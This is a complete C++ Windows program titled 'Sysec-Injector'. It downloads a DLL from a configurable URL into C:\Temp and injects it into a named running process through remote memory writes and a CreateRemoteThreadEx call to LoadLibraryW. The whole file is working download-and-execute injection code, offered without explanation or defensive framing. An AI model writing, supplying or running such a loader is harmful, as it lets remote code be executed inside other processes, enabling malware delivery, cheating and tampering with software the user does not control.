#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <iomanip>
#include <Shlwapi.h>
#include <WinINet.h>
#include <fstream>

#pragma comment(lib, "WinINet.lib")
#pragma comment( lib, "shlwapi.lib")

BOOL downloadDLL(LPCTSTR url, LPCTSTR filePath)
{
    HINTERNET hInternet = InternetOpen(L"DownloadDLL", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) {
        return FALSE;
    }

    HINTERNET hURL = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_DONT_CACHE, 0);
    if (!hURL) {
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    HANDLE hFile = CreateFile(filePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        InternetCloseHandle(hURL);
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    DWORD bytesRead;
    BYTE buffer[1024];
    while (InternetReadFile(hURL, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        DWORD bytesWritten;
        if (!WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL) || bytesRead != bytesWritten) {
            CloseHandle(hFile);
            InternetCloseHandle(hURL);
            InternetCloseHandle(hInternet);
            return FALSE;
        }
    }

    CloseHandle(hFile);
    InternetCloseHandle(hURL);
    InternetCloseHandle(hInternet);

    {
        std::ifstream file;
        file.open(filePath);
        if (!file)
            return FALSE;
    }

    return TRUE;
}

BOOL injectDLL(DWORD pid, LPCTSTR dllPath)
{
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        return FALSE;
    }

    LPVOID remoteDllPath = VirtualAllocEx(hProcess, NULL, (lstrlen(dllPath) + 1) * sizeof(TCHAR), MEM_COMMIT, PAGE_READWRITE);
    if (!remoteDllPath) {
        CloseHandle(hProcess);
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, remoteDllPath, dllPath, (lstrlen(dllPath) + 1) * sizeof(TCHAR), NULL)) {
        VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    HANDLE hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW"), remoteDllPath, 0, NULL, NULL);
    if (!hThread) {
        VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return TRUE;
}

DWORD getProcessIdByName(const wchar_t* processName)
{
    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (snapshot != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32W processEntry = { 0 };
        processEntry.dwSize = sizeof(processEntry);

        if (Process32FirstW(snapshot, &processEntry))
        {
            do
            {
                if (wcscmp(processEntry.szExeFile, processName) == 0)
                {
                    pid = processEntry.th32ProcessID;
                    break;
                }
            } while (Process32NextW(snapshot, &processEntry));
        }

        CloseHandle(snapshot);
    }

    return pid;
}

int main()
{
    LPCTSTR url = L"Current Link";
    LPCTSTR dllPath = L"C:\\Temp\\Sysec.dll";
    LPCTSTR targetProcess = L"EXE.exe";

    SetConsoleTitleA("Sysec-Injector");
    
    if (downloadDLL(url, dllPath)) {
        std::cout << "DLL downloaded successfully.\n";
        DWORD pID = 0;
        pID = getProcessIdByName(targetProcess);

        static int waitSeconds = 0;
        while (!pID && waitSeconds < 60)
        {
            std::cout << "Waiting for " << targetProcess << "...\n";
            std::cout << waitSeconds << "/" << "60 \n";
            Sleep(1000);
            waitSeconds++;

            pID = getProcessIdByName(targetProcess);

            if (waitSeconds > 58)
            {
                std::cout << "Timed out while waiting for process.";
                Sleep(5000);
                exit(0);
            }

            if (pID)
            {
                std::cout << "Injecting...\n";
                Sleep(15000);
            }
        }

        if (injectDLL(pID, dllPath))
        {
            std::cout << "DLL has been injected successfully.\n";
            Sleep(2000);
            exit(1);
        }

        std::cout << "Failed to inject into target process.\n";
    }

    std::cout << "Failed to download from the web.\n";

    Sleep(5000);
    exit(0);
}

